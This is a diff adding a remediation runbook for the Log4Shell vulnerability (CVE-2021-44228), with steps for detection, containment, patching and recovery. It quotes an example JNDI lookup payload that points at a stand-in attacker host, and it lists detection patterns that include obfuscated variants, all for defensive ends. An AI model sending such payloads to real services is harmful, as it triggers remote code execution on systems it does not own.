@@ -1,0 +1,24 @@
+Log4Shell (CVE-2021-44228) Remediation Runbook
+
+Summary
+CVE-2021-44228 is a critical remote code execution vulnerability in Apache Log4j 2 (versions 2.0-beta9 through 2.14.1). The JNDI lookup feature processes attacker-controlled strings (for example "${jndi:ldap://attacker/a}") logged by the application, causing it to fetch and execute remote code. CVSS base score 10.0.
+
+Detection
+1. Search application and web server logs for the patterns "${jndi:", "jndi:ldap", "jndi:rmi", "jndi:dns" including obfuscated variants such as "${lower:j}ndi" and URL-encoded forms.
+2. Inventory all Java services and identify those bundling log4j-core. Use dependency scanners (e.g. grype, trivy) and search the filesystem for log4j-core-*.jar.
+3. Monitor outbound LDAP/RMI/DNS connections from application hosts to untrusted destinations, which often indicate successful exploitation callbacks.
+
+Containment
+1. Block outbound LDAP (389/636), RMI (1099) and unexpected DNS egress from affected application servers at the firewall.
+2. Apply WAF rules to drop requests containing JNDI lookup signatures in headers, URIs and body parameters.
+3. Isolate any host showing successful callback or unexpected child processes spawned by the Java process.
+
+Eradication and Remediation
+1. Upgrade Log4j to 2.17.1 or later (2.17.1 addresses CVE-2021-44228, CVE-2021-45046 and CVE-2021-45105).
+2. If immediate upgrade is impossible, set the JVM flag -Dlog4j2.formatMsgNoLookups=true or remove the JndiLookup class: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class.
+3. Rebuild and redeploy container images; do not patch only running containers, as redeploys will reintroduce the vulnerable version.
+
+Recovery and Post-Incident
+1. Rotate any credentials, tokens or keys that were resident on a compromised host.
+2. Perform forensic review for persistence mechanisms, web shells and lateral movement.
+3. Add a regression test and dependency policy to block vulnerable log4j versions in CI.
